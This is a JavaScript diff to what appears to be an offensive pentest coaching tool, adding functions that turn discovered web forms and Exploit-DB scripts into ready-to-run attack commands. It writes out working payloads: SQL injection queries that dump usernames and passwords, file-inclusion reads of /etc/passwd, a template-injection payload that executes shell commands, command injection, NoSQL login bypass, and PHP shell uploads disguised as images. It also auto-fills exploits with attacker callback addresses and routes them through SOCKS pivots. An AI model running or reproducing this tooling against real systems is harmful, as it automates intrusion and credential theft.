@@ -1950,6 +1950,420 @@
     return filled;
   }
 
+  // ---- Pillar 6 Helpers: SOCKS auto-wrap (6.1), Exploit-DB safe-copy auto-patcher (6.4), Tier A web form/CSRF wiring (6.6) ----
+  var _LOCAL_OR_LISTENER_CMD_RE = /^(?:sudo\s+)?(?:hashcat|john|searchsploit|msfvenom|gcc|g\+\+|clang|[A-Za-z0-9_-]*mingw32-gcc|javac|2to3|dos2unix|cp|mv|rm|mkdir|chmod|chown|sed|awk|grep|egrep|fgrep|cat|head|tail|sort|uniq|cut|tr|echo|printf|base64|xxd|file|strings|unzip|7z[ar]?|tar|openssl\s+(?:passwd|enc|dgst|x509|req|pkcs12|rsa)|python3?\s+-m\s+(?:http\.server|py_compile|venv)|\/tmp\/edb-venv\/bin\/pip|pip3?\s+install|nc\s+-[A-Za-z]*l|ncat\s+-[A-Za-z]*l|rlwrap\s+nc|socat\s+TCP-LISTEN|chisel\s+server|ligolo-proxy|sshuttle|ip\s+(?:route|tuntap|link|addr)|responder|tcpdump)\b/i;
+
+  function _factValsForTarget(facts, kind, targetIp) {
+    if (!facts) return [];
+    var out = [];
+    var wantScope = targetIp ? ('host:' + String(targetIp).trim()) : '';
+    if (Array.isArray(facts.facts)) {
+      for (var i = 0; i < facts.facts.length; i++) {
+        var f = facts.facts[i];
+        if (!f || f.state !== 'supported' || f.kind !== kind) continue;
+        if (wantScope && f.scope && f.scope !== wantScope && f.scope !== 'host:target') continue;
+        if (f.value && typeof f.value === 'object') out.push(f.value);
+      }
+      return out;
+    }
+    if (typeof facts.values === 'function') return facts.values(kind) || [];
+    return out;
+  }
+
+  function _buildEdbCliArgs(cliFlags, ctx) {
+    if (!Array.isArray(cliFlags) || !cliFlags.length) return '';
+    var lowerMap = Object.create(null);
+    cliFlags.forEach(function (fl) { lowerMap[String(fl).toLowerCase()] = fl; });
+    function pick(cands) {
+      for (var i = 0; i < cands.length; i++) {
+        if (lowerMap[cands[i]]) return lowerMap[cands[i]];
+      }
+      return '';
+    }
+    var parts = [];
+    var urlFlag = pick(['--url', '-u', '--target-url', '--base-url', '--uri']);
+    var hostFlag = !urlFlag ? pick(['--rhost', '--target', '--host', '-t', '-h']) : '';
+    var portFlag = hostFlag ? pick(['--rport', '--port', '-p']) : '';
+    var lhostFlag = pick(['--lhost', '--lh', '--attacker', '--callback-ip', '--reverse-ip']);
+    var lportFlag = pick(['--lport', '--lp', '--callback-port', '--reverse-port']);
+    var userFlag = pick(['--username', '--user']);
+    var passFlag = pick(['--password', '--pass']);
+
+    if (urlFlag && (ctx.url || ctx.web_origin || ctx.target)) {
+      parts.push(urlFlag + ' ' + (ctx.url || ctx.web_origin || ('http://' + ctx.target)));
+    } else if (hostFlag && ctx.target) {
+      parts.push(hostFlag + ' ' + ctx.target);
+      if (portFlag && (ctx.web_port || ctx.port)) parts.push(portFlag + ' ' + (ctx.web_port || ctx.port));
+    }
+    if (userFlag && ctx.user) parts.push(userFlag + ' ' + shellQuote(ctx.user, 'bash'));
+    if (passFlag && ctx.password) parts.push(passFlag + ' ' + shellQuote(ctx.password, 'bash'));
+    if (lhostFlag && ctx.lhost) parts.push(lhostFlag + ' ' + ctx.lhost);
+    if (lportFlag && ctx.lport) parts.push(lportFlag + ' ' + ctx.lport);
+    return parts.length ? (' ' + parts.join(' ')) : '';
+  }
+
+  function _adaptEdbCommand(action, index, currentFilled, facts, ctx) {
+    if (!action || action.id !== 'edb-run-adapted-exploit' || index !== 0 || !currentFilled) return null;
+    var inspList = _factValsForTarget(facts, 'exploit.script_inspected', ctx && ctx.target);
+    if (!inspList.length) return null;
+    var insp = inspList[inspList.length - 1];
+    for (var i = inspList.length - 1; i >= 0; i--) {
+      if (ctx && ctx.edb_file && inspList[i].edb_file === ctx.edb_file) { insp = inspList[i]; break; }
+    }
+    if (!insp) return null;
+    var origFile = insp.edb_file || (ctx && ctx.edb_file) || 'exploit.py';
+    var lang = String(insp.lang || '').toLowerCase();
+    var runner = (lang === 'ruby' || /\.rb$/i.test(origFile)) ? 'ruby'
+      : (lang === 'perl' || /\.pl$/i.test(origFile)) ? 'perl'
+      : (lang === 'php' || /\.php$/i.test(origFile)) ? 'php'
+      : (lang === 'bash' || /\.sh$/i.test(origFile)) ? 'bash'
+      : 'python3';
+    var plan = insp.patch_plan || {};
+    var hardcoded = Array.isArray(insp.hardcoded_constants) ? insp.hardcoded_constants : (Array.isArray(plan.hardcoded) ? plan.hardcoded : []);
+    var cliFlags = Array.isArray(insp.cli_flags) ? insp.cli_flags : [];
+    var maxArgv = Number(insp.sys_argv_count || 0);
+    var needsConstPatch = plan.needs_const_patch !== undefined ? !!plan.needs_const_patch : (hardcoded.length > 0 && cliFlags.length === 0 && maxArgv === 0 && lang !== 'c' && lang !== 'cpp');
+    var stripBurpProxy = plan.strip_burp_proxy !== undefined ? !!plan.strip_burp_proxy : (Array.isArray(insp.hazards) && insp.hazards.indexOf('burp_proxy') >= 0);
+
+    if (needsConstPatch || stripBurpProxy) {
+      var workFile = plan.working_copy || (/\.[A-Za-z0-9]+$/.test(origFile) ? origFile.replace(/(\.[A-Za-z0-9]+)$/, '_obol$1') : (origFile + '_obol'));
+      var sedExprs = [];
+      var summaryParts = [];
+      var assignSep = (runner === 'bash') ? '=' : ' = ';
+      if (needsConstPatch) {
+        for (var hi = 0; hi < hardcoded.length; hi++) {
+          var hc = hardcoded[hi];
+          if (!hc || !hc.name) continue;
+          var nk = hc.name.toLowerCase();
+          var val = '';
+          if (nk === 'url' || nk === 'target_url' || nk === 'base_url') {
+            val = (ctx && (ctx.url || ctx.web_origin)) || ((ctx && ctx.target) ? ('http://' + ctx.target) : '');
+          } else if (nk === 'target' || nk === 'target_ip' || nk === 'host' || nk === 'rhost' || nk === 'victim' || nk === 'victim_ip') {
+            val = (ctx && ctx.target) || '';
+          } else if (nk === 'rport') {
+            val = String((ctx && (ctx.web_port || ctx.port)) || '80');
+          } else if (nk === 'lhost' || nk === 'attacker' || nk === 'attacker_ip' || nk === 'srvhost') {
+            val = (ctx && ctx.lhost) || '';
+          } else if (nk === 'lport' || nk === 'srvport') {
+            val = String((ctx && ctx.lport) || '4444');
+          }
+          if (!val || String(val).indexOf('{{') >= 0) continue;
+          var lhsPat = (hc.dollar ? '\\\\\\$' : '') + _reEsc(hc.name);
+          var lhsRep = (hc.dollar ? '\\$' : '') + hc.name;
+          if (hc.numeric && /^\d+$/.test(String(val))) {
+            sedExprs.push("s|^([[:space:]]*)" + lhsPat + "[[:space:]]*=[[:space:]]*(['\"][0-9]+['\"]|[0-9]+)|\\1" + lhsRep + assignSep + String(val) + "|");
+          } else {
+            var safeVal = String(val).replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/&/g, '\\&').replace(/\|/g, '\\|');
+            sedExprs.push("s|^([[:space:]]*)" + lhsPat + "[[:space:]]*=[[:space:]]*['\"][^'\"]*['\"]|\\1" + lhsRep + assignSep + "'" + safeVal + "'|");
+          }
+          summaryParts.push((hc.dollar ? '$' : '') + hc.name + '=' + val);
+        }
+      }
+      if (stripBurpProxy) {
+        sedExprs.push("s|^([[:space:]]*)proxies[[:space:]]*=[[:space:]]*\\{[^}]*\\}|\\1proxies = {}|g");
+        sedExprs.push("s|,[[:space:]]*proxies[[:space:]]*=[[:space:]]*proxies\\b||g");
+        summaryParts.push('proxies={}');
+      }
+      if (sedExprs.length) {
+        var cliTail = (!needsConstPatch && cliFlags.length) ? _buildEdbCliArgs(cliFlags, ctx || {}) : '';
+        return {
+          filled: 'cp ' + origFile + ' ' + workFile + ' && sed -i -E "' + sedExprs.join('; ') + '" ' + workFile + ' && ' + runner + ' ' + workFile + cliTail,
+          edbPatchSummary: 'Safe copy ' + workFile + ' auto-patched (' + summaryParts.join(', ') + '; ' + origFile + ' untouched)'
+        };
+      }
+    }
+
+    if (cliFlags.length) {
+      var builtArgs = _buildEdbCliArgs(cliFlags, ctx || {});
+      if (builtArgs) {
+        return {
+          filled: runner + ' ' + origFile + builtArgs,
+          edbPatchSummary: ''
+        };
+      }
+    } else if (maxArgv > 0 && ctx && ctx.target) {
+      var posArgs = [ctx.url || ('http://' + ctx.target)];
+      if (maxArgv >= 2 && ctx.lhost) posArgs.push(ctx.lhost);
+      if (maxArgv >= 3 && ctx.lport) posArgs.push(String(ctx.lport));
+      return {
+        filled: runner + ' ' + origFile + ' ' + posArgs.join(' '),
+        edbPatchSummary: ''
+      };
+    }
+    return null;
+  }
+
+  function _selectWebSpec(actionId, facts, ctx, opts) {
+    var tgt = ctx && ctx.target;
+    var formFacts = _factValsForTarget(facts, 'web.forms_discovered', tgt);
+    var reqFacts = _factValsForTarget(facts, 'web.http_request_captured', tgt);
+    if (!formFacts.length && !reqFacts.length) return null;
+
+    var allForms = [], allLinks = [], baseOrigin = '';
+    formFacts.forEach(function (fv) {
+      if (fv.baseOrigin && !baseOrigin) baseOrigin = fv.baseOrigin;
+      if (Array.isArray(fv.forms)) fv.forms.forEach(function (fm) { allForms.push(fm); });
+      if (Array.isArray(fv.links)) fv.links.forEach(function (lk) { allLinks.push(lk); });
+    });
+    var latestReq = reqFacts.length ? reqFacts[reqFacts.length - 1] : null;
+    var origin = (latestReq && latestReq.origin) || baseOrigin || (ctx && ctx.web_origin) || ('http://' + ((ctx && ctx.target) || '127.0.0.1'));
+    var cookieJar = ((ctx && ctx.lootdir) || 'loot') + '/cookies.txt';
+
+    var selForm = null;
+    if (allForms.length) {
+      var wantedIdx = (opts && typeof opts.selectedFormIdx === 'number') ? opts.selectedFormIdx : -1;
+      if (wantedIdx >= 0 && wantedIdx < allForms.length) {
+        selForm = allForms[wantedIdx];
+      } else if (actionId === 'file-upload') {
+        for (var fi = 0; fi < allForms.length; fi++) {
+          if (allForms[fi].hasFile || allForms[fi].isMultipart) { selForm = allForms[fi]; break; }
+        }
+      } else if (actionId === 'nosql-injection') {
+        for (var ni = 0; ni < allForms.length; ni++) {
+          if (/login|auth|signin/i.test(allForms[ni].action) || (allForms[ni].userFields || []).some(function (uf) { return uf.type === 'password'; })) {
+            selForm = allForms[ni];
+            break;
+          }
+        }
+      }
+      if (!selForm && !(actionId === 'file-upload' && latestReq && latestReq.boundary)) selForm = allForms[0];
+    }
+
+    return {
+      origin: origin,
+      cookieJar: cookieJar,
+      form: selForm,
+      forms: allForms,
+      links: allLinks,
+      req: latestReq
+    };
+  }
+
+  function _pickParamName(fields, preferRe) {
+    if (!Array.isArray(fields) || !fields.length) return '';
+    if (preferRe) {
+      for (var i = 0; i < fields.length; i++) {
+        if (preferRe.test(fields[i].name)) return fields[i].name;
+      }
+    }
+    return fields[0].name || '';
+  }
+
+  function _csrfFlags(csrfFields, mode) {
+    if (!Array.isArray(csrfFields) || !csrfFields.length) return '';
+    return csrfFields.map(function (cf) {
+      var pair = cf.name + '=' + (cf.value || '');
+      if (mode === 'multipart') return ' -F ' + shellQuote(pair, 'bash');
+      return ' --data-urlencode ' + shellQuote(pair, 'bash');
+    }).join('');
+  }
+
+  function _adaptWebExploitCommand(action, index, currentFilled, facts, ctx, opts) {
+    if (!action || !currentFilled) return null;
+    var aid = action.id;
+    if (aid !== 'sqli-basics' && aid !== 'manual-sqli-exploitation' && aid !== 'lfi-probe' && aid !== 'file-upload' && aid !== 'ssti' && aid !== 'nosql-injection' && aid !== 'command-injection') {
+      return null;
+    }
+    var spec = _selectWebSpec(aid, facts, ctx, opts);
+    if (!spec) return null;
+    var cookieFlags = (spec.req && spec.req.cookies && !spec.form)
+      ? (' -H ' + shellQuote('Cookie: ' + spec.req.cookies, 'bash'))
+      : (' -b ' + spec.cookieJar + ' -c ' + spec.cookieJar);
+
+    if (aid === 'file-upload') {
+      var upEndpoint = '';
+      var fileField = '';
+      var extraMultipart = '';
+      if (spec.form && (spec.form.hasFile || spec.form.isMultipart)) {
+        upEndpoint = spec.origin + spec.form.action;
+        fileField = (spec.form.fileFields && spec.form.fileFields[0] && spec.form.fileFields[0].name) || 'file';
+        extraMultipart = _csrfFlags(spec.form.csrfFields, 'multipart');
+        (spec.form.userFields || []).forEach(function (uf) {
+          if (uf.value) extraMultipart += ' -F ' + shellQuote(uf.name + '=' + uf.value, 'bash');
+        });
+      } else if (spec.req && spec.req.boundary) {
+        upEndpoint = spec.req.origin + spec.req.pathname;
+        var mpFile = (spec.req.params || []).filter(function (p) { return p.loc === 'multipart' && p.filename !== undefined && p.filename !== ''; })[0];
+        fileField = (mpFile && mpFile.name) || 'file';
+        (spec.req.params || []).forEach(function (p) {
+          if (p.loc === 'multipart' && (!mpFile || p.name !== mpFile.name) && p.value) {
+            extraMultipart += ' -F ' + shellQuote(p.name + '=' + p.value, 'bash');
+          }
+        });
+      }
+      if (!upEndpoint) return null;
+      if (index === 0) {
+        return { filled: 'curl -skL' + cookieFlags + ' -F ' + shellQuote(fileField + '=@test.txt', 'bash') + extraMultipart + ' ' + shellQuote(upEndpoint, 'bash'), webTargetSummary: 'POST ' + upEndpoint + ' (' + fileField + ')' };
+      }
+      if (index === 1) {
+        return { filled: 'curl -skL' + cookieFlags + ' -F ' + shellQuote(fileField + '=@shell.php;type=image/png', 'bash') + extraMultipart + ' ' + shellQuote(upEndpoint, 'bash'), webTargetSummary: 'POST ' + upEndpoint + ' (' + fileField + ')' };
+      }
+      return null;
+    }
+
+    if (aid === 'nosql-injection' && index === 0) {
+      if (spec.form) {
+        var uFields = spec.form.userFields || [];
+        var userF = _pickParamName(uFields, /user|email|login|account|uid/i) || 'user';
+        var passF = _pickParamName(uFields.filter(function (f) { return f.name !== userF; }), /pass|pwd|secret/i) || 'pass';
+        var loginUrl = spec.origin + spec.form.action;
+        var csrfBody = (spec.form.csrfFields || []).map(function (cf) { return encodeURIComponent(cf.name) + '=' + encodeURIComponent(cf.value || ''); }).join('&');
+        var bodyStr = userF + '[$ne]=x&' + passF + '[$ne]=x' + (csrfBody ? ('&' + csrfBody) : '');
+        return { filled: 'curl -skL -i' + cookieFlags + ' -X ' + spec.form.method + ' ' + shellQuote(loginUrl, 'bash') + ' -d ' + shellQuote(bodyStr, 'bash'), webTargetSummary: spec.form.method + ' ' + spec.form.action + ' (' + userF + ', ' + passF + ')' };
+      }
+      if (spec.req && spec.req.params && spec.req.params.length >= 2) {
+        var rLoginUrl = spec.req.origin + spec.req.pathname;
+        var rU = spec.req.params[0].name, rP = spec.req.params[1].name;
+        if (spec.req.params[0].loc === 'json') {
+          var jPayload = '{"' + rU + '":{"$ne":null},"' + rP + '":{"$ne":null}}';
+          return { filled: 'curl -skL -i' + cookieFlags + ' -X ' + spec.req.method + " -H 'Content-Type: application/json' " + shellQuote(rLoginUrl, 'bash') + ' -d ' + shellQuote(jPayload, 'bash'), webTargetSummary: spec.req.method + ' ' + spec.req.pathname + ' (JSON ' + rU + ', ' + rP + ')' };
+        }
+      }
+      return null;
+    }
+
+    // Parameterized GET link / form / captured request adaptation for SQLi, LFI, SSTI, CMDi
+    var preferMap = {
+      'sqli-basics': /id|item|cat|prod|user|uid|num|order|sort|q|search|query/i,
+      'manual-sqli-exploitation': /id|item|cat|prod|user|uid|num|order|sort|q|search|query/i,
+      'lfi-probe': /page|file|path|view|include|inc|doc|template|tpl|lang|module|dir|read/i,
+      'ssti': /name|user|template|tpl|title|msg|message|content|preview|text|q/i,
+      'command-injection': /ip|host|ping|addr|target|cmd|exec|domain|url|file|dest/i
+    };
+    var prefRe = preferMap[aid];
+    var method = 'GET', endpoint = '', paramName = '', baseVal = '1', extraFlags = '';
+
+    if (aid === 'lfi-probe' && spec.links && spec.links.length) {
+      var lfiLink = spec.links[0];
+      for (var li = 0; li < spec.links.length; li++) {
+        if (spec.links[li].params.some(function (p) { return prefRe.test(p.name); })) { lfiLink = spec.links[li]; break; }
+      }
+      method = 'GET';
+      endpoint = spec.origin + lfiLink.pathname;
+      paramName = _pickParamName(lfiLink.params, prefRe);
+      var lpMatch = lfiLink.params.filter(function (p) { return p.name === paramName; })[0];
+      baseVal = (lpMatch && lpMatch.value) || '1';
+    } else if (spec.form && (spec.form.userFields || []).length) {
+      method = spec.form.method || 'GET';
+      endpoint = spec.origin + spec.form.action;
+      paramName = _pickParamName(spec.form.userFields, prefRe);
+      var ufMatch = spec.form.userFields.filter(function (f) { return f.name === paramName; })[0];
+      baseVal = (ufMatch && ufMatch.value) || '1';
+      extraFlags = _csrfFlags(spec.form.csrfFields, 'urlencoded');
+      spec.form.userFields.forEach(function (uf) {
+        if (uf.name !== paramName) extraFlags += ' --data-urlencode ' + shellQuote(uf.name + '=' + (uf.value || 'test'), 'bash');
+      });
+    } else if (spec.links && spec.links.length) {
+      var bestLink = spec.links[0];
+      for (var li2 = 0; li2 < spec.links.length; li2++) {
+        if (spec.links[li2].params.some(function (p) { return prefRe && prefRe.test(p.name); })) { bestLink = spec.links[li2]; break; }
+      }
+      method = 'GET';
+      endpoint = spec.origin + bestLink.pathname;
+      paramName = _pickParamName(bestLink.params, prefRe);
+      var bpMatch = bestLink.params.filter(function (p) { return p.name === paramName; })[0];
+      baseVal = (bpMatch && bpMatch.value) || '1';
+    } else if (spec.req && spec.req.params && spec.req.params.length) {
+      var nonMp = spec.req.params.filter(function (p) { return p.loc === 'query' || p.loc === 'body'; });
+      if (nonMp.length) {
+        method = nonMp[0].loc === 'body' ? spec.req.method : 'GET';
+        endpoint = spec.req.origin + spec.req.pathname;
+        paramName = _pickParamName(nonMp, prefRe);
+        var rpMatch = nonMp.filter(function (p) { return p.name === paramName; })[0];
+        baseVal = (rpMatch && rpMatch.value) || '1';
+      }
+    }
+
+    if (!endpoint || !paramName) return null;
+    var payload = '';
+    if (aid === 'sqli-basics') {
+      payload = index === 0 ? (baseVal + "'") : (index === 1 ? (baseVal + ' AND 1=1-- -') : (baseVal + ' UNION SELECT 1,2,3-- -'));
+    } else if (aid === 'manual-sqli-exploitation') {
+      var payloads = [
+        baseVal + ' ORDER BY 5-- -',
+        '0 UNION SELECT 1,2,3,4,5-- -',
+        '0 UNION SELECT 1,@@version,database(),current_user(),5-- -',
+        '0 UNION SELECT 1,group_concat(username,0x3a,password),3,4,5 FROM users-- -',
+        baseVal + ' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)=0x61,SLEEP(3),0)-- -',
+        '0 UNION SELECT 1,LOAD_FILE(0x2f6574632f706173737764),3,4,5-- -'
+      ];
+      payload = payloads[index] || payloads[0];
+    } else if (aid === 'lfi-probe') {
+      payload = index === 0 ? '../../../../etc/passwd' : (index === 1 ? '....//....//....//etc/passwd' : 'php://filter/convert.base64-encode/resource=index');
+    } else if (aid === 'ssti') {
+      payload = index === 0 ? '{{7*7}}' : (index === 1 ? '{{config}}' : "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}");
+    } else if (aid === 'command-injection') {
+      if (index === 0) payload = '127.0.0.1;id';
+      else if (index === 2) payload = '127.0.0.1;cat${IFS}/etc/passwd';
+      else return null;
+    }
+
+    if (!payload) return null;
+    var verbFlags = method === 'GET' ? ' -G' : (' -X ' + method);
+    var cmdOut = 'curl -skL' + cookieFlags + verbFlags + ' ' + shellQuote(endpoint, 'bash') + ' --data-urlencode ' + shellQuote(paramName + '=' + payload, 'bash') + extraFlags;
+    return {
+      filled: cmdOut,
+      webTargetSummary: method + ' ' + endpoint.replace(/^https?:\/\/[^\/]+/, '') + ' (' + paramName + ')'
+    };
+  }
+
+  function _hasActiveSocksOnlyPivot(facts, targetIp, opts) {
+    if (opts && opts.viaSocks === false) return false;
+    if (opts && opts.viaSocks === true) return true;
+    if (!facts) return false;
+    var pivVals = _factValsForTarget(facts, 'tunnel.reachable_via_pivot', targetIp);
+    for (var i = 0; i < pivVals.length; i++) {
+      var pv = pivVals[i];
+      if (!pv || pv.active === false) continue;
+      if (pv.tunnelKind === 'route') return false;
+      if (pv.tunnelKind === 'socks') return true;
+      if (/\b(?:ligolo|sshuttle)\b/i.test(String(pv.via || ''))) return false;
+      if (/\b(?:chisel|socks|ssh-dynamic)\b|ssh\s+-D/i.test(String(pv.via || ''))) return true;
+    }
+    return false;
+  }
+
+  function _wrapSegmentForSocks(seg) {
+    var s = String(seg || '').trim();
+    if (!s || /^proxychains4?\b/i.test(s) || _LOCAL_OR_LISTENER_CMD_RE.test(s)) return null;
+    var envPrefix = '';
+    var envM = /^((?:[A-Za-z_][A-Za-z0-9_]*=(?:"[^"]*"|'[^']*'|[^\s"']+)\s+)+)([\s\S]+)$/.exec(s);
+    var rest = s;
+    if (envM) {
+      envPrefix = envM[1];
+      rest = envM[2];
+    }
+    if (/^proxychains4?\b/i.test(rest) || _LOCAL_OR_LISTENER_CMD_RE.test(rest)) return null;
+    if (/^(?:sudo\s+)?nmap\b/i.test(rest) && !/\s-sU\b/.test(rest)) {
+      var nm = rest.replace(/^sudo\s+/i, '');
+      if (/\s-sS\b/.test(nm)) nm = nm.replace(/\s-sS\b/g, ' -sT');
+      else if (!/\s-sT\b/.test(nm) && !/\s-sn\b/.test(nm)) nm = nm.replace(/^nmap\b/i, 'nmap -sT');
+      if (!/\s-Pn\b/.test(nm)) nm = nm.replace(/^nmap\b/i, 'nmap -Pn');
+      if (!/\s-n\b/.test(nm)) nm = nm.replace(/^nmap\b/i, 'nmap -n');
+      return envPrefix + 'proxychains4 -q ' + nm;
+    }
+    if (/^sudo\s+/i.test(rest)) {
+      return envPrefix + rest.replace(/^sudo\s+/i, 'sudo proxychains4 -q ');
+    }
+    return envPrefix + 'proxychains4 -q ' + rest;
+  }
+
+  function _applySocksWrapping(cmdStr) {
+    var s = String(cmdStr || '').trim();
+    if (!s || /\bproxychains4?\b/i.test(s)) return null;
+    if (s.indexOf(' && ') >= 0) {
+      var parts = s.split(' && ');
+      var anyWrapped = false;
+      var mapped = parts.map(function (pt) {
+        var w = _wrapSegmentForSocks(pt);
+        if (w) { anyWrapped = true; return w; }
+        return pt;
+      });
+      return anyWrapped ? mapped.join(' && ') : null;
+    }
+    return _wrapSegmentForSocks(s);
+  }
+
   // Fill a command variant of an action (0-based). Returns {tool, run, note, filled, webNote}.
   // obol is the hands-on edition: where an action carries a web-suited command (`web` on a
   // variant, or `web_command` on the action) - one tuned for a human who must copy/paste or attach
@@ -1968,19 +2382,62 @@
     var c = commands[index] || {};
     var run = c.web || c.run || action.web_command || action.command || '';
     var errors = [];
-    var fillOpts = Object.assign({}, opts, { action: action, command: run, locus: opts.locus || (OBOL.pack && OBOL.pack.commandExecutionLocus ? OBOL.pack.commandExecutionLocus(c) : 'remote'), shell: c.shell || opts.shell || inferShell(run), errors: errors });
+    var effLocus = opts.locus || (OBOL.pack && OBOL.pack.commandExecutionLocus ? OBOL.pack.commandExecutionLocus(c, action) : (c.locus === 'onhost' ? 'onhost' : 'remote'));
+    var fillOpts = Object.assign({}, opts, { action: action, command: run, locus: effLocus, shell: c.shell || opts.shell || inferShell(run), errors: errors });
     if (!fillOpts.context && facts && facts.forAction) fillOpts.context = facts.forAction(action, c)._resolvedContext;
+    var ctx = buildContext(facts, fillOpts);
     var filled = fillTemplate(run, facts, fillOpts);
     var actForArsenal = (c.tool && action && c.tool !== action.tool) ? Object.assign({}, action, { cmdTool: c.tool }) : action;
+    var finalFilled = errors.length ? '' : applyArsenal(filled, actForArsenal, opts.arsenal);
+    var edbPatchSummary = '';
+    var webTargetSummary = '';
+
+    if (finalFilled && !errors.length) {
+      var edbAdapted = _adaptEdbCommand(action, index, finalFilled, facts, ctx);
+      if (edbAdapted && edbAdapted.filled) {
+        finalFilled = applyArsenal(edbAdapted.filled, actForArsenal, opts.arsenal);
+        edbPatchSummary = edbAdapted.edbPatchSummary || '';
+      }
+      var webAdapted = _adaptWebExploitCommand(action, index, finalFilled, facts, ctx, opts);
+      if (webAdapted && webAdapted.filled) {
+        finalFilled = applyArsenal(webAdapted.filled, actForArsenal, opts.arsenal);
+        webTargetSummary = webAdapted.webTargetSummary || '';
+      }
+    }
+
+    var socksAvailable = false;
+    var socksWrapped = false;
+    var unwrappedFilled = finalFilled;
+    var wrappedFilled = finalFilled;
+    if (finalFilled && !errors.length && effLocus !== 'onhost' && _hasActiveSocksOnlyPivot(facts, ctx && ctx.target, opts)) {
+      var candidateWrap = _applySocksWrapping(finalFilled);
+      if (candidateWrap && candidateWrap !== finalFilled) {
+        socksAvailable = true;
+        wrappedFilled = candidateWrap;
+        if (!opts.unwrapSocks) {
+          finalFilled = wrappedFilled;
+          socksWrapped = true;
+        }
+      }
+    }
+
     return {
       tool: c.tool || action.tool || '',
+      locus: effLocus,
+      alt: !!c.alt,
       note: c.note || '',
       webNote: c.web_note || action.web_note || '',
       win: !!c.win,   // a box-ending move - the coach flags it "PWN THIS TARGET"
       run: run,
       // thread the action so the loot glue can resolve {{userlist}}/{{hashfile}} for THIS move, then
       // rewrite to the operator's synced box (invocation + wordlist paths) - a no-op until they sync.
-      filled: errors.length ? '' : applyArsenal(filled, actForArsenal, opts.arsenal),
+      filled: finalFilled,
+      unwrappedFilled: unwrappedFilled,
+      wrappedFilled: wrappedFilled,
+      socksAvailable: socksAvailable,
+      socksWrapped: socksWrapped,
+      edbPatchSummary: edbPatchSummary,
+      webTargetSummary: webTargetSummary,
       blocked: errors.length > 0, errors: errors,
     };
   }
